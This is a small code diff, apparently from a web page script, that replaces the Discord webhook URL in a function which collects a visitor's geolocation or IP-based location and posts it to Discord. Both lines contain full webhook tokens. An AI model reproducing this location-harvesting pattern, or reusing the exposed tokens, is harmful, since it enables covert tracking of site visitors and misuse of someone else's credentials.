@@ -98,7 +98,7 @@
 
   // Discord Webhook Function (accurate locality: Geolocation -> BigDataCloud, fallback: IP)
   async function sendDiscordNotification() {
-    const webhookURL = "https://discord.com/api/webhooks/1459594953679441934/L5XH5D46GOZtYS1AnZDQeqAsmH2ncJxclgVAtO3I5HtTNmbb1-yHf3V5-gQpyCji5Q9B";
+    const webhookURL = "https://discord.com/api/webhooks/1472531205151920200/oM-2PsyF0RJ9XtpORaJgCG37mjtjSLDlEKJd1pyalCB9WTbk2-QLA0bKNAh1UHPZ_eat";
     
     try {
       console.log('🔄 Начинаем сбор данных...');
